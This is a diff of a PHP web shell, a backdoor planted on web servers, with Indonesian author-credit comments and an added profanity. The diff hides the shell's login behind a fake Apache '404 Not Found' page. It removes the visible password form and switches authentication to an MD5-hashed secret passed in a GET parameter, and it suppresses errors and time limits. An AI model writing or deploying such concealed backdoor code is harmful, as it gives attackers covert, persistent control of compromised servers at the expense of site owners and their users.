@@ -1,46 +1,24 @@
 <?php
 // recode ? mikir anjing w cape2 bikin lah elu tinggal recode
 // kalo mau recode jngn lupa cantumkan author, hargai w sebagai author
+// NGENTOT
 error_reporting(0);
 session_start();
 set_time_limit(0);
 ignore_user_abort(0);
-$password = "sad";
+$password = "49f0bad299687c62334182178bfd75d8";
 function login() {
 ?>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link rel="icon" href="https://img.icons8.com/ios/500/ghost.png" sizes="32x32">
-<style type="text/css">
-  @import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
-  div.login {
-    display:none;
-  } input[type=password] {
-    font-family: 'Ubuntu Mono', monospace;
-    text-align:center;
-    color:#8a8a8a;
-    padding:7px;
-    border-radius:20px;
-    border:1px solid rgba(222,222,222,0.73);
-    background:rgba(222,222,222,0.73);
-    outline:none;
-  }
-</style>
 <h1>Not Found</h1>
   <p>The request URL <?=$_SERVER['REQUEST_URI']?> was not found on this server.</p>
   <hr>
   <address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>
-<div class="login">
-  <center>
-  <form method="post">
-       <input type="password" name="password" placeholder="input password">
-    </form>
-    </center>
-</div>
 <?php
   exit();
 }
 if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
-  if(empty($password) || (isset($_POST['password']) && ($_POST['password']) == $password)) {
+  if(empty($password) || (isset($_GET['pass']) && (md5($_GET['pass'])) == $password)) {
     $_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
     $agent = $_SERVER['HTTP_USER_AGENT']; 
     $uri = $_SERVER['REQUEST_URI']; 
